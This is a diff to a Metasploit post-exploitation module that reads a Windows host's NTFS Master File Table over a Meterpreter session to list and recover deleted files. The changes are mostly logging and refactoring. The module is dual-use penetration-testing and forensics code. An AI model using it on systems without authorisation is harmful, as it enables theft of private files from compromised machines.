@@ -11,20 +11,27 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-			'Name'		=> 'Windows Gather Recovery Files',
-			'Description'	=> %q{
-					This module list and try to recover deleted files from NTFS file systems.},
-			'License'	=> MSF_LICENSE,
-			'Platform'	=> ['win'],
-			'SessionTypes'	=> ['meterpreter'],
-			'Author'	=> ['Borja Merino <bmerinofe[at]gmail.com>'],
-			'References'    => [
+			'Name'         => 'Windows Gather Deleted Files Enumeration and Recovering',
+			'Description'  => %q{
+					This module list and try to recover deleted files from NTFS file systems. Use
+				the FILES option to guide recovery. Let it empty to enumerate deleted files in the
+				DRIVE. Set FILES to an extension (Ex. "pdf") to recover deleted files with that
+				extension. Or set FILES to a comma separated list of IDs (from enumeration) to
+				recover those files. The user must have into account file enumeration and recovery
+				could take a long time, use the TIMEOUT option to abort enumeration or recovery by
+				extension after that time (in seconds).
+			},
+			'License'      => MSF_LICENSE,
+			'Platform'     => ['win'],
+			'SessionTypes' => ['meterpreter'],
+			'Author'       => ['Borja Merino <bmerinofe[at]gmail.com>'],
+			'References'   => [
 				[ 'URL', 'http://www.youtube.com/watch?v=9yzCf360ujY&hd=1' ]
 			]
 		))
 		register_options(
 			[
-				OptString.new('FILES',[false,'ID or extensions of the files to recover in a comma separated way.',""]),
+				OptString.new('FILES',[false,'ID or extensions of the files to recover in a comma separated way. Let empty to enumerate deleted files.',""]),
 				OptString.new('DRIVE',[true,'Drive you want to recover files from.',"C:"]),
 				OptInt.new('TIMEOUT', [true,'Search timeout. If 0 the module will go through the entire $MFT.', 3600])
 			], self.class)
@@ -51,7 +58,7 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
-		print_status("Drive: #{drive} OS: #{winver}")
+		print_status("System Info - OS: #{winver}, Drive: #{drive}")
 		type = datastore['FILES']
 		files = type.split(',')
 		# To extract files from its IDs
@@ -68,14 +75,14 @@ class Metasploit3 < Msf::Post
 			handle = get_mft_info(drive)
 			if handle != nil
 				data_runs = mft_data_runs(handle)
-				print_status("It seems that MFT is fragmented (#{data_runs.size-1} data runs)") if (data_runs.count > 2)
+				vprint_status("It seems that MFT is fragmented (#{data_runs.size-1} data runs)") if (data_runs.count > 2)
 				to = (datastore['TIMEOUT'].zero?) ? nil : datastore['TIMEOUT']
 				begin
 					::Timeout.timeout(to) do
 						deleted_files(data_runs[1..-1], handle,files)
 					end
 				rescue ::Timeout::Error
-					print_error("Server timed out after #{to} seconds. Skipping...")
+					print_error("Timed out after #{to} seconds. Skipping...")
 				end
 			end
 		end
@@ -98,8 +105,8 @@ class Metasploit3 < Msf::Post
 			rf = client.railgun.kernel32.ReadFile(handle,1024,1024,4,nil)
 			attributes = rf['lpBuffer'][56..-1]
 			name = get_name(attributes)
-			print_status("File to download: #{name}}")
-			print_status("Getting Data Runs ...")
+			print_status("File to download: #{name}")
+			vprint_status("Getting Data Runs ...")
 			data = get_data_runs(attributes)
 			if data == nil or name == nil
 				print_error("There were problems to recover the file: #{name}")
@@ -110,32 +117,31 @@ class Metasploit3 < Msf::Post
 			if data[0] == 0
 				print_status ("The file is resident. Saving #{name} ... ")
 				path = store_loot("resident.file", "application/octet-stream", session, data[1], name.downcase, nil)
-				print_good("File saved: #{name.downcase}")
+				print_good("File saved on #{path}")
 
 			# If file no resident
 			else
-				path = store_loot("nonresident.file", "application/octet-stream", session, nil, name.downcase, nil)
-
 				# Due to the size of the non-resident files we have to store small chunks of data as we go through each of the data runs
-				# that make up the file (save_file function). That's way we use store_loot and File.Open in append mode.
-				file = File.open(path, "ab")
+				# that make up the file (save_file function).
 				size = get_size(rf['lpBuffer'][56..-1])
 				print_status ("The file is not resident. Saving #{name} ... (#{size} bytes)")
 				base = 0
 				# Go through each of the data runs to save the file
+				file_data = ""
 				1.upto(data.count-1) { |i|
 					datarun = get_datarun_location(data[i])
 					base = base+datarun[0]
-					size = save_file([base,datarun[1]],size,file,handle)
+					size = save_file([base,datarun[1]],size,file_data,handle)
 				}
-				file.close
-				print_good("File saved: #{name.downcase}")
+				#file.close
+				path = store_loot("nonresident.file", "application/octet-stream", session, file_data, name.downcase, nil)
+				print_good("File saved on #{path}")
 			end
 		}
 	end
 
 	# Save the no resident file to disk
-	def save_file(datarun,size,file,handle)
+	def save_file(datarun,size,file_data,handle)
 		ra = file_system_features(handle)
 		bytes_per_cluster = ra['lpOutBuffer'][44,4].unpack("V*")[0]
 		distance = get_high_low_values(datarun[0]*bytes_per_cluster)
@@ -144,19 +150,19 @@ class Metasploit3 < Msf::Post
 		buffer_size = 8
 		division = datarun[1]/buffer_size
 		rest = datarun[1]%buffer_size
-		print_status("Number of chunks: #{division}	Rest: #{rest} clusters	Chunk size: #{buffer_size} clusters ")
+		vprint_status("Number of chunks: #{division}	Rest: #{rest} clusters	Chunk size: #{buffer_size} clusters ")
 		if (division > 0)
 			1.upto(division) { |i|
 				if (size>bytes_per_cluster*buffer_size)
 					rf = client.railgun.kernel32.ReadFile(handle,bytes_per_cluster*buffer_size,bytes_per_cluster*buffer_size,4,nil)
-					file.write(rf['lpBuffer'])
+					file_data << rf['lpBuffer']
 					size = size - bytes_per_cluster * buffer_size
-					print_status("Save 1 chunk of #{buffer_size*bytes_per_cluster} bytes, there are #{size} left")
+					vprint_status("Save 1 chunk of #{buffer_size*bytes_per_cluster} bytes, there are #{size} left")
 				# It's the last datarun
 				else
 					rf = client.railgun.kernel32.ReadFile(handle,bytes_per_cluster*buffer_size,bytes_per_cluster*buffer_size,4,nil)
-					file.write(rf['lpBuffer'][0..size-1])
-					print_status("Save 1 chunk of #{size} bytes")
+					file_data << rf['lpBuffer'][0..size-1]
+					vprint_status("Save 1 chunk of #{size} bytes")
 				end
 			}
 		end
@@ -166,13 +172,13 @@ class Metasploit3 < Msf::Post
 			if (size<rest*bytes_per_cluster)
 				rf = client.railgun.kernel32.ReadFile(handle,rest*bytes_per_cluster,rest*bytes_per_cluster,4,nil)
 				# Don't save the slack space
-				file.write(rf['lpBuffer'][0..size-1])
-				print_status("(Last datarun) Save 1 chunk of #{size}")
+				file_data << rf['lpBuffer'][0..size-1]
+				vprint_status("(Last datarun) Save 1 chunk of #{size}")
 			else
 				rf = client.railgun.kernel32.ReadFile(handle,bytes_per_cluster*rest,bytes_per_cluster*rest,4,nil)
-				file.write(rf['lpBuffer'])
+				file_data << rf['lpBuffer']
 				size = size - bytes_per_cluster * rest
-				print_status("(No last datarun) Save 1 chunk of #{rest*bytes_per_cluster}, there are #{size} left")
+				vprint_status("(No last datarun) Save 1 chunk of #{rest*bytes_per_cluster}, there are #{size} left")
 			end
 		end
 		return size
@@ -212,18 +218,18 @@ class Metasploit3 < Msf::Post
 			# If FILE header and deleted file (\x00\x00)
 			rf = client.railgun.kernel32.ReadFile(handle,1024,1024,4,nil)
 			if (rf['lpBuffer'][0,4]=="\x46\x49\x4c\x45") and (rf['lpBuffer'][22,2] == "\x00\x00")
-						name = get_name(rf['lpBuffer'][56..-1])
-						if name!= nil
-							print_status("Name: #{name}	ID: #{logc}")
-							# If we want to save it according to the file extensions
-							if files != "" and files.include? File.extname(name.capitalize)[1..-1]
-									print_good("Hidden file found!")
-									recover_file([logc.to_s],handle)
-									dist=get_high_low_values(logc+1024)
-									# We need to restore the pointer to the current MFT entry
-									client.railgun.kernel32.SetFilePointer(handle,dist[0],dist[1],0)
-							end
-						end
+				name = get_name(rf['lpBuffer'][56..-1])
+				if name!= nil
+					print_status("Name: #{name}	ID: #{logc}")
+					# If we want to save it according to the file extensions
+					if files != "" and files.include? File.extname(name.capitalize)[1..-1]
+						print_good("Hidden file found!")
+						recover_file([logc.to_s],handle)
+						dist=get_high_low_values(logc+1024)
+						# We need to restore the pointer to the current MFT entry
+						client.railgun.kernel32.SetFilePointer(handle,dist[0],dist[1],0)
+					end
+				end
 			# MFT entry with no FILE '\x46\x49\x4c\x45' header or its not a deleted file (dir, file, deleted dir)
 			else
 				logc = logc + 1024
@@ -246,7 +252,7 @@ class Metasploit3 < Msf::Post
 		0.upto(data_runs.size - 1) { |i|
 			datar_info = get_datarun_location(data_runs[i])
 			base = base+datar_info[0]
-			print_status("MFT data run #{i+1} is at byte #{base*bytes_per_cluster}. It has a total of #{datar_info[1]} clusters")
+			vprint_status("MFT data run #{i+1} is at byte #{base*bytes_per_cluster}. It has a total of #{datar_info[1]} clusters")
 			# Add to the beginning
 			real_loc.unshift([base*bytes_per_cluster,(bytes_per_cluster*datar_info[1])/1024])
 		}
@@ -287,12 +293,12 @@ class Metasploit3 < Msf::Post
 			bytes_per_cluster = ra['lpOutBuffer'][44,4].unpack("V*")[0]
 			mft_logical_offset = ra['lpOutBuffer'][64,8].unpack("V*")[0]
 			offset_mft_bytes = mft_logical_offset * bytes_per_cluster
-			print_status("Logical cluster : #{ra['lpOutBuffer'][64,8].unpack('h*')[0].reverse}")
-			print_status("NTFS Volumen Serial Number: #{ra['lpOutBuffer'][0,8].unpack('h*')[0].reverse}")
-			print_status("Bytes per Sector: #{ra['lpOutBuffer'][40,4].unpack('V*')[0]}")
-			print_status("Bytes per Cluster: #{bytes_per_cluster}")
-			print_status("Length of the MFT (bytes): #{ra['lpOutBuffer'][56,8].unpack('Q*')[0]}")
-			print_status("Logical cluster where MTF starts #{mft_logical_offset}")
+			vprint_status("Logical cluster : #{ra['lpOutBuffer'][64,8].unpack('h*')[0].reverse}")
+			vprint_status("NTFS Volumen Serial Number: #{ra['lpOutBuffer'][0,8].unpack('h*')[0].reverse}")
+			vprint_status("Bytes per Sector: #{ra['lpOutBuffer'][40,4].unpack('V*')[0]}")
+			vprint_status("Bytes per Cluster: #{bytes_per_cluster}")
+			vprint_status("Length of the MFT (bytes): #{ra['lpOutBuffer'][56,8].unpack('Q*')[0]}")
+			vprint_status("Logical cluster where MTF starts #{mft_logical_offset}")
 			# We set the pointer to the begining of the MFT
 			client.railgun.kernel32.SetFilePointer(r['return'],offset_mft_bytes,0,0)
 			return r['return']
